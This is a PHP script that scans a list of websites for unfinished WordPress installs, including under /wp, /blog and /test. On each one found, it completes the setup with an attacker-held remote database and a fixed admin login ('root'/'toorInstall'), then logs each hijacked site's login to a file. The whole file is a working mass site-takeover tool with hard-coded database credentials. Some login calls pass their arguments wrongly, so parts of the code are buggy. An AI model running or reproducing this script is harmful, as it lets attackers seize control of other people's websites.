<?php

//wp install
//By KangKlepfound
//Thx stackoverflow :v

function CurL($web)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');	
	curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookiewp.txt');  
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookiewp.txt');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$jir = curl_exec($ch);
	curl_close($ch);
	return $jir;	
}
function cPost($url, $data)
{
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookiewp.txt');  
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookiewp.txt');
	$jir = curl_exec($ch);
	curl_close($ch);
	return $jir;
}
/**
Db example for remote =
Username: yQMbpkKngT
Database name: yQMbpkKngT
Password: ixZa9LxLFj
Server: remotemysql.com
Port: 3306
but powefull if u have db host with ip
*/
//setup to ur config
$setup_Config = array(
	'dbname' => 'yQMbpkKngT',           //change to ur dbname
	'uname' => 'yQMbpkKngT',         //change to ur uname 
	'pwd' => 'ixZa9LxLFj',              //change to ur pwd
	'dbhost' => 'remotemysql.com:3306', //change to ur host ex:remotmysql.com:8080
	'prefix' => 'wp_',
	'language' => '',
	'submit' => 'Submit');

/*setup ur site
Change in here
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',  
*/

$f = $argv[1];
$file = file_get_contents($f);
$exp = explode("\r\n", $file);
$i = 0;
foreach ($exp as $key) {
	$i++;
 	$wp = $key.'/wp-admin/setup-config.php';
 	$pw = CurL($wp);
 	$title = preg_match_all("/<title>(.*)<\/title>/is", $pw, $matches);
 	$itit = implode("", $matches[1]);
 	if (preg_match_all("/WordPress &rsaquo; Error/", $itit)) {
 		echo " $key Already install!!\n";
 	}elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $itit)) {
 		echo " $wp OK!\n";
 		echo "  Trying install\n";
 		$s = cPost($key.'/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {
 			$ss = cPost($key.'/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);
 			$bjir = cPost($key.'/wp-admin/install.php?step=2',[
 				'weblog_title' => 'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',   
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			$login = cPost($key,'/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/wp-admin/',
 				'testcookie' =>'1']);
 			$wpadmin = CurL($key,'/wp-admin/index.php');
 			$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
 			$admti = implode("", $matches[1]);
 			if (preg_match_all("/Beauty/",$admti)) {
 				echo "   $key/wp-login.php|root|toorInstall\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/wp-login.php|root|toorInstall';
                fwrite($w, $site."\n");
                fclose($w);	
 			}else{
 				echo "   $key/wp-login.php Cant Login!\n";
 			}
 		}
 	}else{
 		echo " $wp NOT WP!\n";
 	}
 	$wpp = $key.'/wp/wp-admin/setup-config.php';
 	$ppw = CurL($wpp);
 	$title = preg_match_all("/<title>(.*)<\/title>/is", $ppw, $matches);
 	$itit = implode("", $matches[1]); 	
 	if (preg_match_all("/WordPress &rsaquo; Error/", $itit)) {
 		echo " $wpp Already install!!\n";
 	}elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $itit)) {
 		echo " $wpp OK!\n";
 		echo "  Trying install\n";
 		$s = cPost($key.'/wp/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {
 			$ss = cPost($key.'/wp/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);
 			$bjir = cPost($key.'/wp/wp-admin/install.php?step=2',[
 				'weblog_title' =>'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',  
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			$login = cPost($key,'/wp/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/wp/wp-admin/',
 				'testcookie' =>'1']);
 			$wpadmin = CurL($key,'/wp/wp-admin/index.php');
 			$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
 			$admti = implode("", $matches[1]);
 			if (preg_match_all("/Beauty/",$admti)) {
 				echo "   $key/wp/wp-login.php|root|toorInstall\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/wp/wp-login.php|root|toorInstall';
                fwrite($w, $site."\n");
                fclose($w);	
 			}else{
 				echo "   $key/wp/wp-login.php Cant Login!\n";
 			}
 		}
 	}else{
 		echo " $wpp NOT WP!\n";
 	}
 	$blog = $key.'/blog/wp-admin/setup-config.php';
 	$wppp = CurL($blog);
 	$title = preg_match_all("/<title>(.*)<\/title>/is", $wppp, $matches);
 	$itit = implode("", $matches[1]);  	
 	if (preg_match_all("/WordPress &rsaquo; Error/", $itit)) {
 		echo " $blog Already install!\n";
 	}elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $itit)) {
 		echo " $blog OK!\n";
 		echo "  Trying install\n";
 		$s = cPost($key.'/blog/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {
 			$ss = cPost($key.'/blog/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);
 			$bjir = cPost($key.'/blog/wp-admin/install.php?step=2',[
 				'weblog_title' =>'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',   
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			$login = cPost($key,'/blog/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/blog/wp-admin/',
 				'testcookie' =>'1']);
 			$wpadmin = CurL($key,'/blog/wp-admin/index.php');
 			$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
 			$admti = implode("", $matches[1]);
 			if (preg_match_all("/Beauty/",$admti)) {
 				echo "   $key/blog/wp-login.php|root|toorInstall\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/blog/wp-login.php|root|toorInstall';
                fwrite($w, $site."\n");
                fclose($w);	
 			}else{
 				echo "   $key/blog/wp-login.php Cant Login!\n";
 			}
 		}
 	}else{
 		echo " $blog NOT WP!\n";
 	}
 	$tt = $key.'/test/wp-admin/setup-config.php';
 	$test = CurL($tt);
 	$title = preg_match_all("/<title>(.*)<\/title>/is", $test, $matches);
 	$itit = implode("", $matches[1]);  	
 	if (preg_match_all("/WordPress &rsaquo; Error/", $itit)) {
 		echo " $tt Already install!\n";
 	}elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $itit)) {
 		echo " $tt OK!\n";
 		echo "  Trying install\n";
 		$s = cPost($key.'/test/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {
 			$ss = cPost($key.'/test/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);
 			$bjir = cPost($key.'/test/wp-admin/install.php?step=2',[
 				'weblog_title' =>'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',   
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			$login = cPost($key,'/test/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/test/wp-admin/',
 				'testcookie' =>'1']);
 			$wpadmin = CurL($key,'/test/wp-admin/index.php');
 			$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
 			$admti = implode("", $matches[1]);
 			if (preg_match_all("/Beauty/",$admti)) {
 				echo "   $key/test/wp-login.php|root|toorInstall\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/test/wp-login.php|root|toorInstall';
                fwrite($w, $site."\n");
                fclose($w);	
 			}else{
 				echo "   $key/test/wp-login.php Cant Login!\n";
 			}
 		}
 	}else{
 		echo " $tt NOT WP!\n";
 	}
 } 
